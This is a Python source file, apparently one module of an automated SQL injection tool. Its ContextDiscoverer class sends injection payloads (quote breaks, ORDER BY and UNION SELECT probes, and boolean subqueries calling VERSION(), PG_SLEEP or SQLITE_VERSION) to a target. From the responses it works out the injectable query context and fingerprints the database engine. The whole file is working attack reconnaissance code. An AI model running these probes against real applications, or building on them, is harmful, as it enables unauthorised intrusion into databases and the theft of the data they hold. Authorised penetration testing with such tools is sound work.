import random
import re

class ContextDiscoverer:
    def __init__(self, client):
        self.client = client
        self.probes = [
            {"name": "single_quote", "payload": "'", "weight": 1.0},
            {"name": "double_quote", "payload": "\"", "weight": 1.0},
            {"name": "bracket_single", "payload": "')", "weight": 1.0},
            {"name": "bracket_double", "payload": "\")", "weight": 1.0},
            {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
            {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
        ]
        self.detected_context = "UNKNOWN"

    def discover(self):
        print("[*] Phase: Context Discovery (The Eye) active.", flush=True)
        
        # 1. Baseline Request
        baseline = self.client.send_request("")
        baseline_len = len(baseline['text'])
        
        # 2. Inference Logic: Numeric vs String
        # Probe: Arithmetic (Subtle)
        print("  [?] Probing: Numeric Inference (1+0)...", flush=True)
        num_probe = self.client.send_request("1+0")
        if len(num_probe['text']) == baseline_len and num_probe['status'] == 200:
            print("  [?] Probing: Numeric Verification (1+1)...", flush=True)
            num_verify = self.client.send_request("1+1")
            if len(num_verify['text']) == baseline_len:
                self.detected_context = "NUMERIC"
                print(f"[+] Discovery Complete. Detected Context: {self.detected_context} (Inferred via Arithmetic)", flush=True)
                return self.detected_context

        # 3. Inference Logic: Quote Detection (Subtle)
        # Instead of just ', we use a balanced pair or a simple break
        print("  [?] Probing: Quote Inference (')...", flush=True)
        sq_probe = self.client.send_request("'")
        if self._check_sql_errors(sq_probe['text']):
            self.detected_context = "SINGLE_QUOTE"
        else:
            print("  [?] Probing: Quote Inference (\")...", flush=True)
            dq_probe = self.client.send_request("\"")
            if self._check_sql_errors(dq_probe['text']):
                self.detected_context = "DOUBLE_QUOTE"
            else:
                self.detected_context = "GENERIC"

        print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)

        # 3.5 Structural Wrapping Detection (e.g. are we inside quotes AND brackets?)
        print("  [?] Probing: Structural Brackets inference...", flush=True)
        bracket_probe = f"{'1' if self.detected_context == 'NUMERIC' else '1\"' if self.detected_context == 'DOUBLE_QUOTE' else '1\''})"
        bracket_res = self.client.send_request(bracket_probe)
        if self._check_sql_errors(bracket_res['text']) and "syntax" in bracket_res['text'].lower() and ")" in bracket_res['text'].lower():
            self.detected_context += "_PARENTHESIS"
            print(f"  [+] Refined Context: {self.detected_context}", flush=True)
        
        # 4. Fingerprinting Gap: DB Type Identification
        db_type = self.fingerprint_db()
        return {"context": self.detected_context, "db_type": db_type}

    def fingerprint_db(self):
        """Identifies the specific DB engine using subtle behavior probes."""
        print("[*] Phase: DB Fingerprinting active.", flush=True)
        
        # Probes:
        # MySQL: CONNECTION_ID(), VERSION()
        # PostgreSQL: CURRENT_DATABASE(), VERSION()
        # SQLite: SQLITE_VERSION()
        
        probes = [
            ("MySQL", "VERSION()"),
            ("PostgreSQL", "PG_SLEEP(0)"),
            ("SQLite", "SQLITE_VERSION()"),
            ("Oracle", "BITAND(1,1)")
        ]
        
        for name, query in probes:
            print(f"  [?] Checking for {name} signature...", flush=True)
            # Try a very safe injection
            payload = f" AND (SELECT 1 FROM (SELECT {query}) as x)" if self.detected_context == "NUMERIC" else f"' AND (SELECT 1 FROM (SELECT {query}) as x) AND '1'='1"
            res = self.client.send_request(payload)
            if res['status'] == 200 and not self._check_sql_errors(res['text']):
                print(f"  [+] Match found: Target is likely {name}", flush=True)
                return name
        
        return "GENERIC"

    def _check_sql_errors(self, text):
        error_patterns = [
            r"SQL syntax", r"mysql_fetch", r"ORA-", r"PostgreSQL", r"SQLite", r"syntax error"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
